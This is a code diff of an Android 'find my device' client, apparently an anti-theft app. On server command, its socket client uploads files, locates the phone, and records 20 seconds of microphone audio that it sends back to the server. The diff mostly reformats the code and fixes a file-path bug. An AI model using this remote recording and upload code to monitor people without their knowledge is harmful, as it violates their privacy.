@@ -8,6 +8,7 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.net.UnknownHostException;
 
+import android.os.Environment;
 import fmd_android_clint.common.CommandConstant;
 import fmd_android_clint.common.Constants;
 import fmd_android_clint.common.JsonHandler;
@@ -23,7 +24,6 @@ public class SocketClient implements Runnable {
 
 	public ObjectInputStream In;
 	public ObjectOutputStream Out;
- 
 
 	public static int userID;
 	public static int deviceID;
@@ -58,7 +58,7 @@ public class SocketClient implements Runnable {
 
 	@Override
 	public void run() {
-		boolean keepRunning = true; 
+		boolean keepRunning = true;
 
 		while (keepRunning) {
 			is_connected = true;
@@ -109,7 +109,8 @@ public class SocketClient implements Runnable {
 					m.setUserId(userID);
 					m.setDeviceId(deviceID);
 
-					//Log.d("here", new File(parms[1] + "/" + parms[0]).toString());
+					// Log.d("here", new File(parms[1] + "/" +
+					// parms[0]).toString());
 					Thread t = new Thread(new Upload(serverAddr, port,
 							new File(parms[1] + "/" + parms[0]), m));
 					t.start();
@@ -118,33 +119,38 @@ public class SocketClient implements Runnable {
 					Operation.findDeviceLocation();
 				} else if (stringCommand.equals(CommandConstant.recordVoice)) {
 					result.setContent("true");
-					
+
 					new Thread(new Runnable() {
 
-			@Override
-			public void run() { 
+						@Override
+						public void run() {
 							try {
-						Operation.recordVoice(20000);
-					} catch (Exception e){
-						
-					}
-      						 	
-				
-				
-					Command com = new Command(Constants.FIlE_TRANSFARE + "",
-							new String[] { Environment.getExternalStorageDirectory().getAbsolutePath() ,"recording.3gp" });
-					MessageDto m = new MessageDto(MessageDto.CLIENT_TO_SERVER);
+								Operation.recordVoice(20000);
+							} catch (Exception e) {
+								e.printStackTrace();
+							}
 
-					m.setContent(JsonHandler.getCommandJson(com));
-					m.setUserId(userID);
-					m.setDeviceId(deviceID);
+							Command com = new Command(Constants.FIlE_TRANSFARE
+									+ "", new String[] {
 
-					//Log.d("here", new File(parms[1] + "/" + parms[0]).toString());
-					Thread t = new Thread(new Upload(serverAddr, port,
-							new File(parms[0] + "/" + parms[1]), m , true));
-					t.start();
-			}
-		}).start();
+									"recording.3gp",
+									Environment.getExternalStorageDirectory()
+											.getAbsolutePath() });
+							MessageDto m = new MessageDto(
+									MessageDto.CLIENT_TO_SERVER);
+
+							m.setContent(JsonHandler.getCommandJson(com));
+							m.setUserId(userID);
+							m.setDeviceId(deviceID);
+
+							// Log.d("here", new File(parms[1] + "/" +
+							// parms[0]).toString());
+							Thread t = new Thread(new Upload(serverAddr, port,
+									new File(com.getParms()[1] + "/"
+											+ com.getParms()[0]), m, true));
+							t.start();
+						}
+					}).start();
 				}
 				send(JsonHandler.getMessageDtoJson(result));
 			} catch (Exception ex) {
